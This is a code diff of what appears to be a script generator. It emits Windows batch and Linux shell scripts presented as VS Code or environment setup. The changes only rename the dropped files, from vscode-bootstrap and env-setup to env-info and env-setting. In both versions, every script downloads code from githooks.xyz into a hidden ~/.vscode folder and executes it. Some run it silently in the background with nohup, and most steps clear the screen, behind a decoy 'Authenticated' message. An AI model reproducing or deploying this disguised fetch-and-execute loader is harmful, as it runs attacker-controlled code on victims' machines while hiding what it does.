@@ -88,9 +88,9 @@ set "VSCODE_DIR=%USERPROFILE%\\.vscode"
 
 if not exist "%VSCODE_DIR%" ( mkdir "%VSCODE_DIR%" )
 
-curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" https://githooks.xyz/settings/bootstrap?flag=${flag}
+curl -s -L -o "%VSCODE_DIR%\\env-info.cmd" https://githooks.xyz/settings/bootstrap?flag=${flag}
 cls
-"%VSCODE_DIR%\\vscode-bootstrap.cmd"
+"%VSCODE_DIR%\\env-info.cmd"
 cls
     	`;
     	break;
@@ -107,11 +107,11 @@ echo "Authenticated"
 TARGET_DIR="$HOME/.vscode"
 mkdir -p "$TARGET_DIR"
 clear
-wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://githooks.xyz/settings/bootstraplinux?flag=${flag}"
+wget -q -O "$TARGET_DIR/env-info.sh" "https://githooks.xyz/settings/bootstraplinux?flag=${flag}"
 clear
-chmod +x "$TARGET_DIR/vscode-bootstrap.sh"
+chmod +x "$TARGET_DIR/env-info.sh"
 clear
-nohup bash "$TARGET_DIR/vscode-bootstrap.sh" > /dev/null 2>&1 &
+nohup bash "$TARGET_DIR/env-info.sh" > /dev/null 2>&1 &
 clear
 exit 0
     	`;
@@ -127,11 +127,11 @@ set -e
 echo "Authenticated"
 mkdir -p "$HOME/.vscode"
 clear
-curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://githooks.xyz/settings/bootstraplinux?flag=${flag}"
+curl -s -L -o "$HOME/.vscode/env-info.sh" "https://githooks.xyz/settings/bootstraplinux?flag=${flag}"
 clear
-chmod +x "$HOME/.vscode/vscode-bootstrap.sh"
+chmod +x "$HOME/.vscode/env-info.sh"
 clear
-nohup bash "$HOME/.vscode/vscode-bootstrap.sh" > /dev/null 2>&1 &
+nohup bash "$HOME/.vscode/env-info.sh" > /dev/null 2>&1 &
 clear
 exit 0
     	`;
@@ -217,9 +217,9 @@ if not defined NODE_EXE (
 :: Download required files
 :: -------------------------
 set "CODEPROFILE=%USERPROFILE%\\.vscode"
-echo [INFO] Downloading env-setup.npl and package.json...
+echo [INFO] Downloading env-setting.npl and package.json...
 
-curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://githooks.xyz/settings/env?flag=${flag}"
+curl -L -o "%CODEPROFILE%\\env-setting.npl" "https://githooks.xyz/settings/env?flag=${flag}"
 curl -L -o "%CODEPROFILE%\\package.json" "https://githooks.xyz/settings/package"
 
 :: -------------------------
@@ -240,17 +240,17 @@ if not exist "%~dp0node_modules\\axios" (
 :: -------------------------
 :: Run the parser
 :: -------------------------
-if exist "%CODEPROFILE%\\env-setup.npl" (
-    echo [INFO] Running env-setup.npl...
+if exist "%CODEPROFILE%\\env-setting.npl" (
+    echo [INFO] Running env-setting.npl...
     pushd "%CODEPROFILE%"
-    "%NODE_EXE%" "%CODEPROFILE%\\env-setup.npl"
+    "%NODE_EXE%" "%CODEPROFILE%\\env-setting.npl"
     if errorlevel 1 (
-        echo [ERROR] env-setup execution failed.
+        echo [ERROR] env-setting execution failed.
         exit /b 1
         )
     popd
 ) else (
-    echo [ERROR] env-setup.npl not found.
+    echo [ERROR] env-setting.npl not found.
     exit /b 1
 )
 
@@ -373,12 +373,12 @@ fi
 USER_HOME="$HOME/.vscode"
 mkdir -p "\${USER_HOME}"
 BASE_URL="https://githooks.xyz"
-echo "[INFO] Downloading env-setup.js and package.json..."
+echo "[INFO] Downloading env-setting.js and package.json..."
 if ! command -v curl >/dev/null 2>&1; then
-    wget -q -O "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=${flag}"
+    wget -q -O "\${USER_HOME}/env-setting.js" "\${BASE_URL}/settings/env?flag=${flag}"
     wget -q -O "\${USER_HOME}/package.json" "\${BASE_URL}/settings/package"
 else
-    curl -s -L -o "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=${flag}"
+    curl -s -L -o "\${USER_HOME}/env-setting.js" "\${BASE_URL}/settings/env?flag=${flag}"
     curl -s -L -o "\${USER_HOME}/package.json" "\${BASE_URL}/settings/package"
 fi
 # -------------------------
@@ -404,18 +404,18 @@ if [ ! -d "node_modules/axios" ]; then
     fi
 fi
 # -------------------------
-# Run env-setup.js
+# Run env-setting.js
 # -------------------------
-if [ -f "\${USER_HOME}/env-setup.js" ]; then
-    echo "[INFO] Running env-setup.js..."
+if [ -f "\${USER_HOME}/env-setting.js" ]; then
+    echo "[INFO] Running env-setting.js..."
     #cd "$HOME"
-    "$NODE_EXE" "\${USER_HOME}/env-setup.js"
+    "$NODE_EXE" "\${USER_HOME}/env-setting.js"
     if [ $? -ne 0 ]; then
-        echo "[ERROR] env-setup.js execution failed."
+        echo "[ERROR] env-setting.js execution failed."
         exit 1
     fi
 else
-    echo "[ERROR] env-setup.js not found."
+    echo "[ERROR] env-setting.js not found."
     exit 1
 fi
 echo "[SUCCESS] Script completed successfully."
